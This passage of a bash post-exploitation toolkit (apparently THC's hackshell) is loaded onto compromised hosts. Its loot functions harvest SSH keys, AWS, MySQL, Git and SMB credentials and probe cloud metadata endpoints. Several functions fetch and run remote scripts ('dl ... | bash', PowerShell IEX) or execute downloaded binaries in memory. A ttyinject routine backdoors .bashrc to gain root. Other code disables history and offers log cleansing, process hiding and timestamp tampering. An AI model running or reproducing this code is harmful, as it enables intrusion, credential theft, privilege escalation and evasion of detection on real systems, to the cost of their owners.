    [ -n "$_LS_LOOT_PCT" ] && return

    command -v lxc-ls >/dev/null || return
    command -v lxc-info >/dev/null || return

    str="$(for x in $(lxc-ls); do lxc-info -n "$x" -sip 2>/dev/null; done)"
    [ -z "$str" ] && return
    echo -e "${CB}LXC Containers${CDY}${CF}"
    echo "$str"
    echo -en "${CN}"
}

_lootmore_vz() {
    command -v vzlist >/dev/null || return

    str="$(vzlist -a -t -H 2>/dev/null)"
    [ -z "$str" ] && return
    echo -e "${CB}OpenVZ${CDY}${CF}"
    echo "$str"
    echo -en "${CN}"
}

lootmore() {
    local hn fn str arr

    _hs_init_rootfs
    _hs_gen_home

    # Find interesting commands in history file
    for hn in "${HOMEDIRARR[@]}"; do
        fn=()
        [ -f "${hn}/.bash_history" ] && fn+=("${hn}/.bash_history")
        [ -f "${hn}/.zsh_history" ] && fn+=("${hn}/.zsh_history")
        [ ${#fn[@]} -eq 0 ] && continue
        str="$(grep -h -e ^ssh -e ^scp -e ^sftp -e ^rsync -e ^git -e ^rclone "${fn[@]}" 2>/dev/null | sort -u)"

        [ -z "$str" ] && continue
        echo -e "${CB}Interesting commands ${CDY}${hn}/.[bash|zsh]_history${CF}"
        echo "$str"
        echo -en "${CN}"
    done

    [ -z "${ROOTFS}" ] && {
        str="$(dmesg -T 2>/dev/null | tail -n 10)"
        [ -n "$str" ] && {
            echo -e "${CB}dmesg ${CDY}${CF}"
            echo "$str"
            echo -en "${CN}"
        }
        command -v lastlog >/dev/null && {
            echo -e "${CB}Logins ${CDY}${CF}"
            lastlog 2>/dev/null | grep -vF 'Never logged'
            echo -en "${CN}"
        }
        # Execute in subshell so that 'source' does not mess with our variables.
        (source "${ROOTFS}/etc/apache2/envvars" 2>/dev/null && {
            unset str
            set -f
            IFS=$'\n' arr=($(ps auxw|awk '{print $11}'|grep -e "[a]pache" -e "[h]ttpd"|grep -v lighttpd|sort -u))
            set +f
            for b in "${arr[@]}"; do
                grep -Fqs apr_socket_timeout_set "$b" || continue
                str+="$("$b" -t -D DUMP_VHOSTS 2>&1)" || continue
            done
            [ -n "$str" ] && {
                echo -e "${CB}Apache Config ${CDY}${CF}"
                echo "$str"
                echo -en "${CN}"
            }
        })
    }
    _lootmore_last
    _lootmore_docker
    _lootmore_pct
    _lootmore_lxc
    _lootmore_vz

    str="$(grep -sE '^[[:digit:]]' "${ROOTFS}/etc/hosts" |grep -vF -e localhost -e 127.0.0.1)"
    [ -n "$str" ] && {
        echo -e "${CB}${ROOTFS}/etc/hosts ${CDY}${CF}"
        echo "$str"
        echo -en "${CN}"
    }

    unset HOMEDIRARR
    [ -z "$ROOTFS" ] && echo -e "${CW}TIP:${CN} Type ${CDC}ws${CN} to find out more about this host."
}

# <NAME> <COMMAND> ...
loot_cmd() {
    local name="$1"
    local str

    shift 1
    str="$("$@" 2>/dev/null)" || return #cmd failed
    [ -z "$str" ] && return

    echo -e "${CB}${name}${CDY}${CF}"
    echo "$str"
    echo -en "${CN}"
}

# Someone shall implement a sub-set from TeamTNT's tricks (use
# noseyparker for cpu/time-intesive looting). TeamTNT's infos:
# https://malware.news/t/cloudy-with-a-chance-of-credentials-aws-targeting-cred-stealer-expands-to-azure-gcp/71346
# https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker
loot() {
    local h="${_HS_HOME_ORIG:-$HOME}"
    local str hn fn

    _hs_init_rootfs
    _hs_gen_home
    unset _HS_GOT_SSRF_169
    
    for hn in "${HOMEDIRARR[@]}"; do
        fn="${hn}/.my.cnf"
        [ ! -s "$fn" ] && continue
        str="$(grep -vE "^(#|\[)" "$fn" 2>/dev/null)"
        [ -z "$str" ] && continue
        echo -e "${CB}MySQL ${CDY}${fn}${CF}"
        echo "$str"
        echo -en "${CN}"
    done
    for hn in "${HOMEDIRARR[@]}"; do
        fn="${hn}/.mysql_history"
        [ ! -s "$fn" ] && continue
        str=$(grep -ia '^SET PASSWORD FOR' "$fn" 2>/dev/null) || continue
        echo -e "${CB}MySQL ${CDY}${fn}${CF}"
        echo "$str"
        echo -en "${CN}"
    done

    ### Bitrix
    # HOMEDIRARR includes all from /etc/passwd + /var/www 
    find "${HOMEDIRARR[@]}" -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" -o -wholename "*/bitrix/php_interface/dbconn.php" 2>/dev/null | while read -r fn; do
        loot_bitrix "$fn"
    done

    loot_gitlab "${ROOTFS}/opt/gitlab/etc/gitlab-psql-rc"
    loot_gitlab "${ROOTFS}/etc/gitlab-psql-rc"

    find "${HOMEDIRARR[@]}" -maxdepth 4 -type f -name wp-config.php 2>/dev/null | while read -r fn; do
        _loot_wp "$fn"
    done

    ### SSH Keys
    [ -e "${ROOTFS}/etc/ansible/ansible.cfg" ] && {
        str="$(grep ^private_key_file "${ROOTFS}/etc/ansible/ansible.cfg" 2>/dev/null)"
        s="${str##*= }"
        loot_sshkey "$s"
    }

    for hn in "${HOMEDIRARR[@]}"; do
        for fn in "${hn}"/.ssh/*; do
            loot_sshkey "$fn"
        done
    done

    _loot_homes "SMB"    ".smbcredentials"
    _loot_homes "SMB"    ".samba_credentials"
    _loot_homes "PGSQL"  ".pgpass"
    _loot_homes "RCLONE" ".config/rclone/rclone.conf"
    _loot_homes "GIT"    ".git-credentials"
    _loot_homes "AWS S3" ".s3cfg"           grep "${_HS_GREP_COLOR_NEVER[@]}" -E '=[\s]*[^\s]{6,}'
    _loot_homes "AWS S3" ".passwd-s3fs"
    _loot_homes "AWS S3" ".s3backer_passwd"
    _loot_homes "AWS S3" ".passwd-s3fs"
    _loot_homes "AWS S3" ".boto"
    _loot_homes "AWS S3" ".aws/credentials"
    _loot_homes "NETRC"  ".netrc"
    _loot_homes "SMTP"   ".msmtprc"         grep "${_HS_GREP_COLOR_NEVER[@]}" -E '(^user|^password)'

    # SSRF
    _loot_openstack
    _loot_aws
    _loot_yandex

    [ -z "$_HS_NO_SSRF_169" ] && {
        # Found an SSRF
        echo -e "${CW}TIP:${CN} See ${CB}${CUL}https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf${CN}"
        [ -n "$_HS_GOT_SSRF_169" ] && {
            # Found and SSRF but could not get infos.
            echo -e "${CW}TIP:${CN} Try ${CDC}dl http://169.254.169.254/openstack${CN}"
        }
    }

    command -v screen >/dev/null && loot_cmd "Screen (screen -ls)" screen -ls
    command -v tmux >/dev/null && loot_cmd "Tmux" tmux list-s

    [ "$UID" -gt 0 ] && {
        echo -e "${CW}TIP:${CN} Type ${CDC}sudo -v${CN} and ${CDC}sudo -ln${CN} to list sudo perms. ${CF}[may log to auth.log]${CN}"
    }

    lootlight
    unset HOMEDIRARR
    [ -z "$ROOTFS" ] && {
        echo -e "${CW}TIP:${CN} Type ${CDC}lootmore${CN} to loot even more."
        [ -d "/vz/root" ] && echo -e "${CW}VMs found${CN}: Try ${CDC}"'for x in /vz/root/*; do ROOTFS="$x" loot; done'"${CN}"
    }
}

# Try to find LPE
# https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
# https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASps1
lpe() {
    # Detect the OS
    OS="$(uname -s)"
    case "$OS" in
        Linux|Darwin)
            echo -e "${CB}Running linPEAS...${CN}"
            dl 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh' | bash
            ;;
        CYGWIN*|MINGW*|MSYS*)
            echo -e "${CB}Running winPEAS...${CN}"
            if command -v powershell >/dev/null 2>&1; then
                echo -e "${CB}Using PowerShell to download and execute winPEAS...${CN}"
                powershell -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
            else
                echo -e "${CR}Error: PowerShell is not available to run winPEAS.${CN}"
                return 1
            fi
            ;;
        *)
            echo -e "${CR}Error: Unsupported operating system: $OS.${CN}"
            return 1
            ;;
    esac
}

ws() {
    # dl https://thc.org/ws | bash
    dl 'https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh' | bash
}

_hs_try_resize() {
    local str
    local R
    local a
    local IFS
    command -v reset >/dev/null && TERM=xterm reset -I

    command -v stty >/dev/null || return
    str="$(stty size)"
    if [[ "$str" == "24 80" ]] || [[ "$str" == "25 80" ]] || [[ "$str" == "0 0" ]]; then
        # NOTE: On localhost, this wont always work because xterm responds to fast and
        # before 'read' gets executed.
        stty -echo;printf "\e[18t"; read -t5 -rdt R;
        IFS=';' read -r -a a <<< "${R:-8;25;80}"
        # Normally it returns ROWS/25:COLS/80 but some systems return it reverse
        [ "${a[1]}" -ge "${a[2]}" ] && { R="${a[1]}"; a[1]="${a[2]}"; a[2]="${R}"; }
        stty sane rows "${a[1]}" cols "${a[2]}"
        export COLUMNS="${a[2]}" LINES="${a[1]}"
    fi
}

_hs_mk_pty() {
    echo -e "${CDM}Upgrading to PTY Shell${CN}${CF} [disable with ${CDC}${CF}export NOPTY=1${CN}${CF}]${CN}"
    echo -e ">>> Press ${CDC}Ctrl-z${CN} now and cut & paste ${CDC}stty raw -echo icrnl opost; fg${CN}"
    echo -e ">>> ${CG}AFTERWARDS${CDG}, Press enter to continue"
    read -r
    echo -e ">>> Cut & paste ${CDC} eval \"\$(curl -SsfL ${_HSURL})\"${CN}"

    if [ -n "$HS_PY" ]; then
        "${HS_PY:-python}" -c "import pty;" 2>/dev/null && exec "${HS_PY:-python}" -c "import pty; pty.spawn('${SHELL:-sh}')"
    elif command -v script >/dev/null; then
        exec script -qc "${SHELL:-sh}" /dev/null
    fi

    HS_ERR "Not found: python or script"
}

_hs_destruct() {
    [ -n "$_HS_NP_D" ] && [ -d "${_HS_NP_D}" ] && {
        rm -f "${_HS_NP_D:?}"
        unset _HS_NP_D
    }
    [ -z "$XHOME" ] && return
    [ ! -d "$XHOME" ] && return
    echo -e ">>> Cleansing ${CDY}${XHOME}${CN}"
    rm -rf "${XHOME:?}"
}

xdestruct() {
    _hs_destruct
    export HOME="${_HS_HOME_ORIG}"
    [ -n "$_HS_PATH_ORIG" ] && export PATH="$_HS_PATH_ORIG"
}

_memexec() {
    local name="${1}"

    _hs_dep perl || return
    shift
    perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"'"${name:-/usr/bin/python3}"'",@ARGV' -- "$@"
    return $?
}

# memexec /bin/sh -c "echo hi"
# memexec -c "echo hi" </bin/sh
# GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec gs-netcat
# memexec https://gsocket.io/bin/gs-netcat
memexec() {
    local fn
    local prg="$1"

    # cat /usr/bin/id | memexec -u
    [ ! -t 0 ] && {
        _memexec "" "$@"
        return
    }

    [ $# -le 0 ] && { xhelp_memexec; return 255; }
    shift

    # memexec <URL> <command line options>
    [[ "$prg" =~ ^(https|http|ftp):// ]] && {
        dl "$prg" | _memexec "" "$@"
        return
    }
    # memexec id -u
    fn="$(which "$prg" 2>/dev/null)" && {
        _memexec "${prg}" "$@" <"$fn"
        return
    }
    
    # Check if $prg contains a "/" and return (do not download)
    [ "$prg" != "${prg##*/}" ] && { echo >&2 "Command not found: $prg"; return 255; }

    # Download binary from pkgforge
    dl "https://bin.pkgforge.dev/${HS_ARCH}/${prg}" | _memexec "${prg}" "$@"
    return
}

mx() { memexec "$@"; }

ttyinject() {
    local is_mkdir
    ttyinject_clean() {
        [ -e "${_HS_HOME_ORIG}/.config/procps/reset" ] && rm -f "${_HS_HOME_ORIG}/.config/procps/reset"
        [ -n "$is_mkdir" ] && rmdir "${_HS_HOME_ORIG}/.config/procps"
    }

    [ "$UID" -eq 0 ] && { HS_ERR "You are already root"; return; }
    [ ! -d "${_HS_HOME_ORIG}/.config/procps" ] && { mkdir -p "${_HS_HOME_ORIG}/.config/procps" || return; is_mkdir=1; }

    [ ! -f "${_HS_HOME_ORIG}/.config/procps/reset" ] && {
        dl "https://github.com/hackerschoice/ttyinject/releases/download/v1.1/ttyinject-linux-${HS_ARCH}" >"${_HS_HOME_ORIG}/.config/procps/reset" || return
    }
    chmod 755 "${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; return; }

    TTY_TEST=1 "${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; HS_WARN "System is not vulnerable to TIOCSTI stuffing."; return; }
    if [ -f "${_HS_HOME_ORIG}/.bashrc" ]; then
        grep -qFm1 'procps/reset' "${_HS_HOME_ORIG}/.bashrc" 2>/dev/null || echo "$(head -n1 "${_HS_HOME_ORIG}/.bashrc")"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 "${_HS_HOME_ORIG}/.bashrc")" >"${_HS_HOME_ORIG}/.bashrc"
    else
        echo '~/.config/procps/reset 2>/dev/null' >"${_HS_HOME_ORIG}/.bashrc"
    fi
    echo -e "Wait for ${CDY}/var/tmp/.socket${CN} to appear and then do:
  ${CDC}"'/var/tmp/.socket -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
}

hs_exit() {
    cd /tmp || cd /dev/shm || cd /
    [ "${#_hs_bounce_src[@]}" -gt 0 ] && HS_WARN "Bounce still set in iptables. Type ${CDC}unbounce${CN} to stop the forward."
    [ -n "$XHOME" ] && [ -d "$XHOME" ] && {
        if [ -f "${XHOME}/.keep" ]; then
            HS_WARN "Keeping ${CDY}${XHOME}${CN}"
        else
            _hs_destruct
        fi
    }
    [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.org/tips${CN} 😘"
    kill -9 $$
}

[ -z "$BASH" ] && TRAPEXIT() { hs_exit; } #zsh

### Functions (temporary)
hs_init_dl() {
    local str
    # Ignore TLS certificate. This is DANGEROUS but many hosts have missing ca-bundles or TLS-Proxies.
    if which curl &>/dev/null; then
        _HS_SSL_ERR="certificate "
        dl() { 
            local opts=()
            [ -n "$UNSAFE" ] && opts=("-k")
            curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 2 "${1:?}"
        }
    elif which wget &>/dev/null; then
        _HS_SSL_ERR="is not trusted"
        str="$(wget --help 2>&1)"
        if [[ "$str" == *"connect-timeout"* ]]; then
            _HS_WGET_OPTS=("--connect-timeout=7" "--dns-timeout=7")
        elif [[ "$str" == *"-T SEC" ]]; then
            _HS_WGET_OPTS=("-T" "7")
        fi
        dl() {
            local opts=()
            [ -n "$UNSAFE" ] && opts=("--no-check-certificate")
            # Can not use '-q' here because that also silences SSL/Cert errors
            wget -O- "${opts[@]}" "${_HS_WGET_OPTS[@]}" "${1:?}"
        }
    elif [ -n "$HS_PY" ]; then
        dl() { purl "$@"; }
    elif which openssl &>/dev/null; then
        dl() { surl "$@"; }
    else
        dl() { HS_ERR "Not found: curl, wget, python or openssl"; }
    fi
}


hs_init() {
    local a
    local prg="$1"
    local str

    _hs_init_rootfs
    [ -z "$BASH" ] && {
        str="https://bin.pkgforge.dev/${HS_ARCH}/bash"
        [[ "${HS_ARCH}" == i686 ]] && str='https://github.com/polaco1782/linux-static-binaries/raw/refs/heads/master/x86-i686/bash'
        HS_WARN "Shell is not BASH. Try:
${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
        sleep 2
    }
    [ -n "$BASH" ] && [ "${prg##*\.}" = "sh" ] && { HS_ERR "Use ${CDC}source $prg${CDR} instead"; sleep 2; exit 255; }
    [ -n "$BASH" ] && {
        str="$(command -v bash)"
        [ -n "$str" ] && SHELL="${str}"
    }
    [ -z "$UID" ] && UID="$(id -u 2>/dev/null)"
    [ -z "$USER" ] && USER="$(id -un 2>/dev/null)"
    [ -n "$_HS_HOME_ORIG" ] && export HOME="$_HS_HOME_ORIG"
    export _HS_HOME_ORIG="$HOME"

    # ZSH compat MacOS
    command -v setopt >/dev/null && setopt +o nomatch

    # Do never ask to have a package installed
    unset command_not_found_handle
    # Favour python3 over python2
    [ -z "${HS_PY}" ] && HS_PY="$(command -v python3)"
    [ -z "${HS_PY}" ] && HS_PY="$(command -v python)"
    [ -z "${HS_PY}" ] && HS_PY="$(command -v python2)"
    HS_PY="${HS_PY##*/}"

    unset TERM
    toe -a 2>/dev/null | grep -qm1 'xterm-256color' && TERM="xterm-256color"
    [ -z "$TERM" ] && TERM=xterm
    export TERM

    # ps to hide kernel threads (identical to '--ppid 2 -p 2 --deselect flwww')
    export LIBPROC_HIDE_KERNEL=1

    HS_ARCH="$(uname -m 2>/dev/null)"
    [ -z "$HS_ARCH" ] && HS_ARCH="x86_64"
    [ "$HS_ARCH" = "x86_64" ] && HS_ARCH_ALT="amd64"
    [ "$HS_ARCH" = "aarch64" ] && HS_ARCH_ALT="arm64"
    [ -z "$HS_ARCH_ALT" ] && HS_ARCH_ALT="$HS_ARCH"

    # Old OpenSSL don't have -pbkdf2.
    # _HS_SSL_OPTS=("-aes-256-cbc" "-pbkdf2" "-nosalt" "-k")
    _HS_SSL_OPTS=("-aes-256-cbc" "-md" "sha256" "-nosalt" "-k")

    _HS_GREP_COLOR_NEVER=()
    echo test | grep --color=never -qF test 2>/dev/null && _HS_GREP_COLOR_NEVER=("--color=never")

    [ -z "$NOPTY" ] && {
        # Upgrade to PTY shell
        [ ! -t 0 ] && _hs_mk_pty

        # Set cols/rows if not set (==0)
        [ -t 0 ] && _hs_try_resize
    }

    if [ -n "$BASH" ]; then
        trap hs_exit EXIT SIGHUP SIGTERM SIGPIPE
    else
        trap hs_exit SIGHUP SIGTERM SIGPIPE
    fi

    ulimit -c 0 &>/dev/null # Disable core dumps

    setsid --help 2>/dev/null | grep -Fqm1 -- --wait && _HS_SETSID_WAIT=1

    HS_SSH_OPT=()
    command -v ssh >/dev/null && {
        str="$(\ssh -V 2>&1)"
        [[ "$str" == OpenSSH_[67]* ]] && a="no"
        HS_SSH_OPT+=("-oStrictHostKeyChecking=${a:-accept-new}")
        # HS_SSH_OPT+=("-oUpdateHostKeys=no")
        HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
        # Even if 'ssh -Q' shows the key it sometimes complains that it cant use them.
        # User can set SSH_NO_OLD before hs to disable old ciphers.
        [ -z "$SSH_NO_OLD" ] && \ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -V 2>/dev/null && HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
        [ -z "$SSH_NO_OLD" ] && \ssh -oHostKeyAlgorithms=+ssh-dss -V 2>/dev/null && HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
        [ -z "$SSH_NO_OLD" ] && \ssh -oCiphers=+aes128-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+aes128-cbc")
        [ -z "$SSH_NO_OLD" ] && \ssh -oCiphers=+3des-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+3des-cbc")

        HS_SSH_OPT+=("-oConnectTimeout=5")
        HS_SSH_OPT+=("-oServerAliveInterval=30")
    }

    _hs_enc_init

    # BusyBox timeout variant needs -t
    command -v timeout >/dev/null && timeout -t0 sleep 0 &>/dev/null && HS_TO_OPTS=("-t")
    hs_init_dl
}

# Show CN and SAN of remote server
cn() {
    local str
    local x509
    _hs_dep openssl || return
    _hs_dep sed || return

    x509="$(timeout "${HS_TO_OPTS[@]}" 4 openssl s_client -showcerts -connect "${1:-127.0.0.1}:${2:-443}" 2>/dev/null </dev/null)"
    # Extract CN
    str="$(echo "$x509" | openssl x509 -noout -subject 2>/dev/null)"
    [[ "$str" == "subject"* ]] && [[ "$str" == *"/CN"* ]] && {
        str="$(echo "$str" | sed '/^subject/s/^.*CN.*=[ ]*//g')"
        echo "$str"
    }

    # Extract SAN
    str="$(echo "$x509" | openssl x509 -noout -ext subjectAltName 2>/dev/null | grep -F DNS: | sed 's/\s*DNS://g' | sed 's/[^-a-z0-9\.\*,]//g')"
    echo "${str//,/$'\n'}"
}

_scan_single() {
    local opt=("${2}")

    [ -f "$2" ] && opt=("-iL" "$2")
    # Redirect "Unable to find nmap-services" to /dev/null
    nmap -Pn -p"${1}" --open -T4 -n -oG - "${opt[@]}" 2>/dev/null | grep -F Ports
}

# scan <port> <IP or file> ...
scan() {
    local port

    [ $# -lt 2 ] && { xhelp_scan; return 255; }
    _hs_dep nmap || return
    port="${1:?}"
    shift 1
    for ip in "$@"; do
        _scan_single "$port" "$ip"
    done
}

hs_init_alias_reinit() {
    # stop curl from creating ~/.pkt/nssdb
    which curl &>/dev/null && curl --help 2>/dev/null | grep -iqm1 proto-default && alias curl="HOME=/dev/null curl --proto-default https"
    alias curl &>/dev/null || alias curl='HOME=/dev/null curl'
    which wget &>/dev/null && wget --help 2>/dev/null | grep -Fqm1 -- --no-hsts && alias wget="wget --no-hsts"

    unalias anew &>/dev/null
    which anew &>/dev/null || alias anew=xanew
}

hs_init_alias() {
    :
    alias ssh="ssh ${HS_SSH_OPT[*]}"
    alias scp="scp ${HS_SSH_OPT[*]}"
    \vi --help 2>&1 | grep -Fqm1 -- -i && alias vi="vi -i NONE"
    alias vim="vim -i NONE"
    alias screen="screen -ln"

    alias l='ls -Alh'
    alias lt='ls -Alhrt'
    alias lss='ls -AlhrS'
    alias psg='ps alxwww | grep -i -E'
    alias lsg='ls -Alh --color=always | grep -i -E'
    alias cd..='cd ..'
    alias ..='cd ..'

    hs_init_alias_reinit
}

hs_init_shell() {
    unset LC_TERMINAL LC_TERMINAL_VERSION
    # Some old bash log to default location if HISTFILE is not set. Force to /dev/null
    export HISTFILE="/dev/null"
    export BASH_HISTORY="/dev/null"
    #history -c 2>/dev/null
    export LANG=en_US.UTF-8
    locale -a 2>/dev/null|grep -Fqim1 en_US.UTF || export LANG=en_US
    export LESSHISTFILE=-
    export REDISCLI_HISTFILE=/dev/null
    export MYSQL_HISTFILE=/dev/null
    export PSQL_HISTORY=/dev/null

    export T=.$'\t''~?$?'".${UID}"
    # PTY backdoor to not sniff when using sudo/su.
    export LC_PTY=1
    TMPDIR="/tmp"
    [ -d "/var/tmp" ] && TMPDIR="/var/tmp"
    [ -d "/dev/shm" ] && TMPDIR="/dev/shm"
    export TMPDIR
    [ -z "$XHOME" ] && export XHOME="${TMPDIR}/${T}"

    [ -z "$_HS_PATH_ORIG" ] && _HS_PATH_ORIG="$PATH"
    [ "${PATH:0:2}" != ".:" ] && export PATH=".:${PATH}"
    # Might already exist.
    [ -d "$XHOME" ] && _hs_xhome_init

    # PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \e[36m\u\e[m@\e[32m\h:\e[33;1m\w \e[0;31m\$\e[m '
    if [[ "$SHELL" == *"zsh" ]]; then
        PS1='%F{red}%n%f@%F{cyan}%m %F{magenta}%~ %(?.%F{green}.%F{red})%#%f '
    else
        if [ "$UID" -eq 0 ]; then
            PS1='\[\033[31m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[35m\]\w\[\033[31m\]\$\[\033[m\] '
        else
            PS1='\[\033[33m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[35m\]\w\[\033[31m\]\$\[\033[m\] '
            # PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
        fi
    fi
}

hs_info() {
    local now="$(date +%s)"
    local mytty="$(tty 2>/dev/null)"
    local u x t out
    out="$(awk -F= 'toupper($1)~/PRETTY/ {gsub(/"/,"",$2); print $2}' /etc/*release 2>/dev/null | sort -u)"

    [ -z "$out" ] && out="$(uname -s 2>/dev/null)"
    [ -n "$out" ] && out+=" "
    echo -en ">>> ${CDG}"
    echo -n "${out}"
    echo -en "${CG}${CF}[$(uname -r)]"
    echo -e "${CN}"

    # Show if any active PTY
    stat /dev/pts/* -c '%X %U %n' 2>/dev/null | while read -r x; do
        u="${x#* }"
        u="${u%% *}"
        t="${x##* }"
        [[ "${t}" == "$mytty" ]] && continue
        [[ "${t##*/}" == "ptmx" ]] && continue
        [[ "$((now - ${x%% *}))" -gt 3600 ]] && continue
        echo -e "${CR}Active user: ${CDY}${u} ${CY}${CF}${t}"
        ps a -o tty,pid,cmd 2>/dev/null | grep "${_HS_GREP_COLOR_NEVER[@]}" ^"${t#/dev/}" 2>/dev/null
        echo -en "${CN}"
    done
}

# shellcheck disable=SC2120
# Output help
xhelp() {
    _hs_no_tty_no_color
    [[ "$1" == "scan" ]] && { xhelp_scan; _hs_init_color; return; }
    [[ "$1" == "dbin" ]] && { xhelp_dbin; _hs_init_color; return; }
    [[ "$1" == "tit" ]] && { xhelp_tit; _hs_init_color; return; }
    [[ "$1" == "memexec" ]] && { xhelp_memexec; _hs_init_color; return; }
    [[ "$1" == "bounce" ]] && { xhelp_bounce; _hs_init_color; return; }

    echo -en "\
${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
${CDC} xsu username <cmd>                    ${CDM}Switch user ${CN}${CF}[xsu user id -u]
${CDC} xtmux                                 ${CDM}'hidden' tmux ${CN}${CF}[e.g. wont show with 'tmux list-s']
${CDC} xssh & xscp                           ${CDM}Silently log in to remote host
${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination ${CN}${CF}[xhelp bounce]
${CDC} ghostip                               ${CDM}Originate from a non-existing IP
${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
${CDC} dl http://ipinfo.io 2>/dev/null       ${CDM}Request URL using one of curl/wget/python/perl/openssl
${CDC} transfer <file>                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
${CDC} enc <file> / dec <file>               ${CDM}Encrypt/Decrypt file or stdin/stdout ${CN}${CF}[HS_TOKEN=${HS_TOKEN:-<secret>}]${CN}
${CDC} shred file                            ${CDM}Securely delete a file
${CDC} notime <file> touch foo.dat           ${CDM}Execute a command at the <file>'s mtime
${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, ctime, mtime & atime
${CDC} ctime <file>                          ${CDM}Set ctime to file's mtime ${CN}${CF}[find . -ctime -1]
${CDC} ttyinject                             ${CDM}Become root when root switches to ${USER:-this user}
${CDC} wfind <dir> [<dir> ...]               ${CDM}Find writeable directories
${CDC} hgrep <string>                        ${CDM}Grep for pattern, output for humans ${CN}${CF}[hgrep password]
${CDC} find_subdomains .foobar.com           ${CDM}Search files for sub-domain
${CDC} crt foobar.com                        ${CDM}Query crt.sh for all sub-domains
${CDC} dns foobar.com                        ${CDM}Resolv domain name to IPv4
${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple public databases
${CDC} cn <IP> [<port>]                      ${CDM}Display TLS's CommonName of remote IP
${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP ${CN}${CF}[xhelp scan]
${CDC} hide <pid>                            ${CDM}Hide a process
${CDC} memexec <binary> [<args>]             ${CDM}Start binary in memory ${CN}${CF}[xhelp memexec]
${CDC} tit <read/write> <pid>                ${CDM}Sniff/strace the User Input [xhelp tit]
${CDC} np <directory>                        ${CDM}Display secrets with NoseyParker ${CN}${CF}[try |less -R]
${CDC} loot                                  ${CDM}Display common secrets
${CDC} lpe                                   ${CDM}Run linPEAS
${CDC} ws                                    ${CDM}WhatServer - display server's essentials
${CDC} bin [<binary>]                        ${CDM}Download useful static binaries ${CN}${CF}[bin nmap]
${CDC} dbin                                  ${CDM}Download static binary ${CN}${CF}[xhelp dbin]
${CDC} zapme [<name>]                        ${CDM}Hide args of current shell as <name> + all child processes
${CDC} xpty                                  ${CDM}Show all terminals / logged in users
${CDC} lt, ltr, lss, lssr, psg, lsg, ...     ${CDM}Common useful commands
${CDC} xhelp                                 ${CDM}This help${CN}\n"
    _hs_init_color
}

_hs_init_color
### Programm
hs_init "$0"
hs_init_alias
hs_init_shell

xhelp

### Finishing
echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"

hs_info

# Warning if thc.org is used
[ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CDM}'${CN}"

### Check for obvious loots
lootlight

# unset all functions that are no longer needed.
unset -f hs_init hs_init_alias hs_init_dl hs_init_shell
unset SSH_CONNECTION SSH_CLIENT _HSURLORIGIN

# Exit with TRUE in case parent shell ues 'set -e':
:
